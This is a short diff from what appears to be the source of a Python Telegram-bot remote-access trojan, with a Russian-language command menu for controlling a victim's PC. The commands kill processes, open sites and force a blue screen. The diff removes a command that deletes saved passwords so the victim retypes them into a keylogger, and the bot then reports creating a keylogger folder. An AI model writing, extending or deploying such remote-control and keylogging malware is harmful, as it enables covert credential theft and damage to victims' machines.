@@ -165,8 +165,8 @@ def My_PC(message):
 11. Узнать инфу о пк - /info
 12. Закрыть какой-то процесс - /kill_process + cmd.exe и тд.
 13. Открыть сайт по ссылке - /sites (https://....)
-14. Синий экран смерти - /blue_screen
-15. удаление сохраннёных паролей что бы пользователь ввёл все пароли в keloger - /delete_password\</b>''')
+14. Синий экран смерти - /blue_screen\</b>''')
+    
     bot.send_message(message.chat.id, text, parse_mode='html')
 
     bot.send_message(message.chat.id, "Создание папки где будет лежить keyloger")
